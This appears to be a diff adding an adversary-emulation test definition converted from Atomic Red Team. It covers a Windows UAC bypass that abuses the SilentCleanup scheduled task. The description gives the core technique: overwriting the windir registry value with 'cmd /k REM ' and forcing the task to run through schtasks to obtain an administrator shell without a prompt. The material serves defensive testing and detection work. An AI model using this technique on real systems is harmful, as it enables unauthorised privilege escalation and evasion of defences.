@@ -1,0 +1,57 @@
+# Converted from Atomic Red Team - Abuse Elevation Control Mechanism: Bypass User Account Control
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
+# Original auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+
+---
+api_version: 2.0
+uuid: 9c3df4f6-fedf-48d9-b931-6d5af05d35ff
+name: Bypass UAC using SilentCleanup task
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+  There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+  For example, we can set the windir registry key to: "cmd /k REM "
+
+  And forcefully run SilentCleanup task:
+
+  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+  REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+    - TA0005 Defense Evasion
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.002 Bypass User Account Control
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+args:
+  - name: bat_file_path
+    description: Path to the bat file
+    type: path
+    default: ./T1548.002.bat
+
+steps:
+  - name: ensure_bat_file_exists
+    executor: cmd.exe
+    inline: |
+      if not exist "{{.Args.bat_file_path}}" (
+        echo Bat file not found at {{.Args.bat_file_path}}. Exiting...
+        exit 1
+      )
+
+  - name: execute_silentcleanup_bypass
+    executor: cmd.exe
+    inline: |
+      "{{.Args.bat_file_path}}"
